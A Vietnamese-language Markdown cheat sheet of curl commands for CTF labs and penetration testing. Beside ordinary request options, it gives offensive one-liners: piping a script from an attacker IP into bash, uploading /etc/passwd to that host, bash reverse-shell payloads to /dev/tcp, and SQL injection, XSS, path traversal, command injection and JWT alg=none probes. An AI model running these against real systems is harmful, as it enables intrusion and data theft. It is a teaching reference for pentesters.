# cURL Pentest Cheat Sheet

> Tổng hợp các lệnh curl phổ biến dùng trong CTF, HackTheBox, TryHackMe & pentest thực tế — theo phong cách ippsec & pentesters uy tín.

---

## 📌 Cơ bản

```bash
# GET request đơn giản
curl http://target.com

# Verbose output (xem headers, SSL info, redirect)
curl -v http://target.com

# Silent mode (chỉ lấy body)
curl -s http://target.com

#- Chỉ lấy header (`-I`). Không hiển thị các thông tin phụ (thanh tiến trình, lỗi kết nối) (`-s`).
curl -sI http://target.com

# Lưu response ra file
curl -o output.html http://target.com

# Lưu với tên file gốc từ URL
curl -O http://target.com/file.zip
```

---

## 🔍 Recon & Enumeration

```bash
# Chỉ lấy headers (HEAD request)
curl -I http://target.com

# Xem headers response đầy đủ
curl -D - http://target.com -o /dev/null

# Follow redirects
curl -L http://target.com

# Giới hạn số redirect
curl -L --max-redirs 5 http://target.com

# Resolve hostname thủ công (bypass DNS)
curl --resolve target.com:80:10.10.10.10 http://target.com

# Kết nối qua IP trực tiếp nhưng giữ Host header
curl -H "Host: target.com" http://10.10.10.10
```

---

## 📤 POST / PUT / PATCH / DELETE

```bash
# POST form data (application/x-www-form-urlencoded)
curl -X POST -d "username=admin&password=pass123" http://target.com/login

# POST JSON
curl -X POST -H "Content-Type: application/json" \
  -d '{"username":"admin","password":"pass123"}' \
  http://target.com/api/login

# PUT request
curl -X PUT -H "Content-Type: application/json" \
  -d '{"role":"admin"}' http://target.com/api/user/1

# DELETE request
curl -X DELETE http://target.com/api/user/1

# Upload file (multipart)
curl -F "file=@shell.php" http://target.com/upload

# Upload với tên field tùy chỉnh
curl -F "avatar=@evil.php;type=image/jpeg" http://target.com/upload
```

---

## 🔐 Authentication

```bash
# Basic Auth
curl -u admin:password http://target.com/admin

# Bearer Token
curl -H "Authorization: Bearer eyJhbGc..." http://target.com/api/me

# API Key trong header
curl -H "X-API-Key: abc123" http://target.com/api/data

# Cookie thủ công
curl -H "Cookie: session=abc123; admin=true" http://target.com/dashboard

# Lưu và gửi cookie (cookie jar)
curl -c cookies.txt http://target.com/login
curl -b cookies.txt http://target.com/dashboard

# Login rồi dùng cookie tiếp
curl -c cookies.txt -b cookies.txt \
  -d "user=admin&pass=admin" http://target.com/login
```

---

## 🧪 Web App Testing

```bash
# Test SQL Injection trong GET param
curl "http://target.com/item?id=1'"

# Test XSS (URL encode nếu cần)
curl "http://target.com/search?q=<script>alert(1)</script>"

# SSRF – thử trỏ đến internal host
curl -d "url=http://127.0.0.1:8080/admin" http://target.com/fetch

# Path traversal
curl "http://target.com/download?file=../../etc/passwd"

# Host header injection
curl -H "Host: evil.com" http://target.com/

# X-Forwarded-For bypass
curl -H "X-Forwarded-For: 127.0.0.1" http://target.com/admin

# Thêm nhiều header tùy chỉnh
curl -H "X-Custom-IP-Authorization: 127.0.0.1" \
     -H "X-Forwarded-Host: localhost" \
     http://target.com/admin
```

---

## 🔒 HTTPS / SSL

```bash
# Bỏ qua kiểm tra SSL certificate (self-signed)
curl -k https://target.com

# Dùng client certificate (mTLS)
curl --cert client.crt --key client.key https://target.com

# Chỉ định CA bundle
curl --cacert ca.crt https://target.com

# Xem chi tiết SSL handshake
curl -v --silent https://target.com 2>&1 | grep -E "SSL|TLS|cert"
```

---

## 🌐 Proxy & Tunneling

```bash
# Qua Burp Suite (intercept)
curl -x http://127.0.0.1:8080 http://target.com

# Qua Burp với HTTPS (bỏ verify cert)
curl -k -x http://127.0.0.1:8080 https://target.com

# Qua SOCKS5 proxy (ví dụ: SSH tunnel hoặc proxychains)
curl --socks5 127.0.0.1:1080 http://target.com

# Qua Tor
curl --socks5-hostname 127.0.0.1:9050 http://target.com

# Set proxy qua biến môi trường
export http_proxy=http://127.0.0.1:8080
export https_proxy=http://127.0.0.1:8080
curl http://target.com
```

---

## 📁 File Transfer (Post-Exploitation)

```bash
# Download file từ attacker machine (Python HTTP server)
curl http://10.10.14.1/linpeas.sh -o /tmp/linpeas.sh

# Download và chạy luôn
curl http://10.10.14.1/shell.sh | bash

# Download binary
curl http://10.10.14.1/nc -o /tmp/nc && chmod +x /tmp/nc

# Upload file về attacker (dùng khi có web server nhận PUT)
curl -T /etc/passwd http://10.10.14.1/loot/passwd

# Upload qua POST
curl -F "f=@/etc/passwd" http://10.10.14.1:8888/
```

---

## 🐚 Reverse Shell / RCE Testing

```bash
# Test RCE qua GET parameter
curl "http://target.com/ping?host=127.0.0.1;id"

# Test command injection với URL encoding
curl "http://target.com/exec?cmd=id%26whoami"

# Gửi reverse shell payload qua POST
curl -d "cmd=bash+-i+>%26+/dev/tcp/10.10.14.1/4444+0>%261" \
  http://target.com/rce

# Dùng --data-urlencode để tự encode
curl --data-urlencode "cmd=bash -i >& /dev/tcp/10.10.14.1/4444 0>&1" \
  http://target.com/rce
```

---

## ⚙️ API & REST Pentesting

```bash
# Enumerate endpoints
curl -s http://target.com/api/v1/users | python3 -m json.tool

# IDOR – thay đổi ID
for i in $(seq 1 20); do
  curl -s "http://target.com/api/user/$i" | grep -v "not found"
done

# Mass assignment – gửi thêm field không mong muốn
curl -X POST -H "Content-Type: application/json" \
  -d '{"username":"attacker","password":"pass","role":"admin","isAdmin":true}' \
  http://target.com/api/register

# JWT None algorithm attack
# (tạo token với alg=none, không có chữ ký)
curl -H "Authorization: Bearer eyJhbGciOiJub25lIn0.eyJ1c2VyIjoiYWRtaW4ifQ." \
  http://target.com/api/admin
```

---

## 🕵️ Headers & User-Agent

```bash
# Đổi User-Agent (bypass WAF / filter)
curl -A "Mozilla/5.0 (Windows NT 10.0; Win64; x64)" http://target.com

# Googlebot
curl -A "Googlebot/2.1 (+http://www.google.com/bot.html)" http://target.com

# Referer giả mạo
curl -e "http://admin.target.com/" http://target.com/secret

# Thêm nhiều header cùng lúc
curl -H "X-Forwarded-For: 127.0.0.1" \
     -H "X-Real-IP: 10.0.0.1" \
     -H "Referer: http://localhost/" \
     -H "User-Agent: sqlmap/1.7" \
     http://target.com
```

---

## ⏱️ Timing & Rate Control

```bash
# Giới hạn tốc độ download (tránh bị detect)
curl --limit-rate 100K http://target.com/bigfile.zip

# Timeout kết nối
curl --connect-timeout 5 http://target.com

# Timeout toàn bộ request
curl --max-time 10 http://target.com

# Retry khi fail
curl --retry 3 --retry-delay 2 http://target.com
```

---

## 🧰 Tips & Tricks ippsec Style

```bash
# Xem full request + response (debug hoàn chỉnh)
curl -v -s http://target.com 2>&1 | tee /tmp/curl_debug.txt

# Grep nhanh thứ cần tìm
curl -s http://target.com | grep -i "flag\|token\|secret\|password"

# Dùng jq parse JSON response
curl -s http://target.com/api/users | jq '.[] | .username'

# Base64 decode response tự động
curl -s http://target.com/data | base64 -d

# Gửi raw bytes / binary data
curl -X POST --data-binary @payload.bin http://target.com/upload

# Kết hợp với ffuf (wordlist qua pipe)
# (curl để kiểm tra trước, ffuf để fuzz sau)
curl -s -o /dev/null -w "%{http_code}" http://target.com/admin

# Đo thời gian phản hồi (blind timing attack)
curl -o /dev/null -s -w "Time: %{time_total}s\n" \
  "http://target.com/login?user=admin'%20AND%20SLEEP(5)--"

# Gửi request với HTTP/1.0 (bypass một số check)
curl --http1.0 http://target.com

# Gửi chunked transfer encoding
curl -H "Transfer-Encoding: chunked" -d "data=test" http://target.com
```
- Note: 2>&1 liên quan đến I/O Redirection có thể đọc thêm ở đây: [Bash pentest cheatsheet](Bash%20pentest%20cheatsheet.md)
---

## 📋 Tham khảo nhanh — HTTP Status Codes

|Code|Ý nghĩa|
|---|---|
|200|OK – tìm thấy|
|301/302|Redirect|
|400|Bad Request|
|401|Unauthorized (cần auth)|
|403|Forbidden (có thể bypass)|
|404|Not Found|
|405|Method Not Allowed (thử method khác)|
|500|Internal Server Error (có thể khai thác)|
|502/503|Gateway / Service issue|

---

## 🔗 Công cụ kết hợp thường dùng

|Tool|Mục đích|
|---|---|
|`Burp Suite`|Intercept & modify qua `-x 127.0.0.1:8080`|
|`jq`|Parse JSON response|
|`python3 -m json.tool`|Pretty-print JSON nhanh|
|`tee`|Vừa xem vừa lưu output|
|`grep / awk / sed`|Lọc dữ liệu từ response|
|`base64 -d`|Decode encoded response|
|`xxd / hexdump`|Xem binary response|

---

_Cheat sheet này tổng hợp từ phong cách pentest của ippsec (HackTheBox walkthroughs), TCM Security, và các OSCP writeups thực tế._